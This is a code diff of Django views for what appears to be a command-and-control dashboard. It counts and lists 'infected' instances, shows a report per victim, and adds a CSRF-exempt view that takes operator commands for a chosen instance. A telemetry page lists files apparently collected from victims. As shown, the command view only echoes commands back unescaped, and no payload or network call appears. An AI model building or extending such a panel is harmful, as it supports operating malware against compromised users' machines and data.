@@ -1,28 +1,34 @@
 from django.shortcuts import render
+from django.views.decorators.csrf import csrf_exempt
+from django.http import HttpRequest, HttpResponse
 
 # Create your views here.
-import requests
+from api.models import Instancia
 
-def dashboard(request):
-    return render(request, "web/dashboard.html")
+def dashboard(request: HttpRequest):
+    infectados = Instancia.objects.count()
+    return render(request, "web/dashboard.html", {"infectados": infectados})
 
-def user_list(request):
-    return render(request, "web/user_list.html", {"infectados": [
-        "user1",
-        "user2",
-        "user3",
-        "user4",
-    ]})
+def user_list(request: HttpRequest):
+    infectados = Instancia.objects.all()
+    return render(request, "web/user_list.html", {"infectados": infectados})
 
-def user_control(request):
-    return render(request, "web/user_control.html", {"infectados": [
-        "user1",
-        "user2",
-        "user3",
-        "user4",
-    ]})
+def user_report(request: HttpRequest, infectado):
+    infectado = Instancia.objects.get(pk=infectado)
+    return render(request, "web/user_report.html", {"infectado": infectado})
 
-def telemetry(request):
+def user_control(request: HttpRequest):
+    infectados = Instancia.objects.all()
+    return render(request, "web/user_control.html", {"infectados": infectados})
+
+@csrf_exempt
+def user_control_instance(request: HttpRequest, infectado):
+    infectado = Instancia.objects.get(pk=infectado)
+    if request.method == "POST":
+        return HttpResponse(f'<p style="margin-bottom: -6px;">[{request.user.username}] {request.POST.get("command", "NADA")}</p>')
+    return render(request, "web/user_control_instance.html", {"infectado": infectado})
+
+def telemetry(request: HttpRequest):
     return render(request, "web/telemetry.html", {"archivos": [
         ["asd1.log", "27KB", ".LOG", "user1", "now"],
         ["asd2.txt", "8KB", ".TXT", "user3", " 3 hours ago"],
